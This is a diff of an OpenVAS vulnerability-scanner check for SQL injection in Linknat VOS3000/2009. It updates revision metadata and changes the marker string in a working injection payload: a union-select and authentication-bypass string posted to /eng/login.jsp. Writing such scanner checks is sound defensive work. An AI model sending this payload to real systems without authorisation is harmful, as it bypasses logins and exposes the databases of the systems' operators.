@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_linknat_vos_sql_inj.nasl 11026 2018-08-17 08:52:26Z cfischer $
+# $Id: gb_linknat_vos_sql_inj.nasl 11449 2018-09-18 10:04:42Z mmartin $
 #
 # Linknat VOS3000/2009 SQL Injection Vulnerability
 #
@@ -30,8 +30,8 @@ CPE = 'cpe:/a:linknat:vos';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.106085");
-  script_version("$Revision: 11026 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:52:26 +0200 (Fri, 17 Aug 2018) $");
+  script_version("$Revision: 11449 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-05-25 12:52:24 +0700 (Wed, 25 May 2016)");
   script_tag(name:"cvss_base", value:"9.4");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");
@@ -79,7 +79,7 @@ if( !port)
 
 host = http_host_name(port: port);
 
-data = "loginType=1&name='+union+select+1,2,3,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,5,6#&pass='+OR+''='";
+data = "loginType=1&name='+union+select+1,2,3,0x53514c2d496e6a656374696f6e2d54657374,5,6#&pass='+OR+''='";
 
 req = http_post_req(port: port, url: "/eng/login.jsp", data: data,
                     add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
@@ -91,7 +91,7 @@ if (!cookie)
 
 cookie = cookie[1];
 
-if (http_vuln_check(port: port, url: '/eng/welcome.jsp', pattern: 'OpenVAS-SQL-Injection-Test',
+if (http_vuln_check(port: port, url: '/eng/welcome.jsp', pattern: 'SQL-Injection-Test',
                     cookie: cookie)) {
   security_message(port: port);
   exit(0);
